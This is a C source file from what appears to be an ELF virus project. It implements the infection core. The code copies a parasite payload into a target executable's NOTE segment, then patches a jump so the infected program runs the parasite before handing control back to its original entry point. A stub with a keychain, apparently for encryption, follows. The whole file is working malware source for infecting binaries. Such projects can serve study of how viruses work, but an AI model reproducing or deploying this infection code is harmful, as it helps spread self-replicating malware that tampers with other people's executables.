#include <war.h>

////////////////////////////////////////////////////////////////////////////////
/// STATIC FUNCTIONS
////////////////////////////////////////////////////////////////////////////////

__attribute__((always_inline)) static inline void insert_parasite(char *dst, Elf64_Phdr **segment)
{
	_memcpy(dst + segment[NOTE]->p_offset, __entry, segment[NOTE]->p_filesz);
}

__attribute__((always_inline)) static inline void patch_entry_point(char *dst, const struct s_host *host)
{
	size_t offset = JUMP_SIZE;

	dst += host->segment[NOTE]->p_offset + ((void *)execution - (void *)__entry);

	while (true)
	{
		if (*(unsigned char *)dst == 0xe9)
		{
			dst++;
			offset++;
			break;
		}
		offset++;
		dst++;
	}

	const size_t entry_point = host->entry[OLD] - (host->segment[NOTE]->p_vaddr + (((void *)execution + offset) - (void *)__entry));

	_memcpy(dst, &entry_point, sizeof(int));
}


////////////////////////////////////////////////////////////////////////////////
/// PUBLIC FUNCTION
////////////////////////////////////////////////////////////////////////////////

void parasite(struct s_host *host, struct s_keychain *keychain, enum e_context context, struct s_injection *injection)
{

#if LOGGER
	MID_LOGGER("parasite:\t\t");
#endif

	if (context == FAILURE)
		goto label;

	insert_parasite(injection->ptr, host->segment);
	patch_entry_point(injection->ptr, host);

label:
	stub(host, keychain, context, injection);
}
